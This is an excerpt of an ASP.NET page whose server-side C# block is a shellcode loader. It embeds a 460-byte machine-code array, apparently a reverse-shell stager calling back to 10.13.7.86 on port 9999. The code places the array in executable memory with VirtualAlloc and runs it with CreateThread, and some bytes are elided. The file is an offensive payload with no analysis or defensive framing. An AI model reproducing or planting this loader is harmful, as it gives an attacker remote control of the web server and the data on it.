...
<script runat="server">
    ...
    {
        byte[] uYLDT = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
...
0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x27,0x0f,
0x0a,0x0d,0x07,0x56,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,
...
0x59,0x41,0x89,0xda,0xff,0xd5};
        ...
        IntPtr vTYXex_4 = VirtualAlloc(IntPtr.Zero,(UIntPtr)uYLDT.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(uYLDT,0,vTYXex_4,uYLDT.Length);
        IntPtr aHll = IntPtr.Zero;
        IntPtr jrx37tkrO = CreateThread(IntPtr.Zero,UIntPtr.Zero,vTYXex_4,IntPtr.Zero,0,ref aHll);
    }
</script>
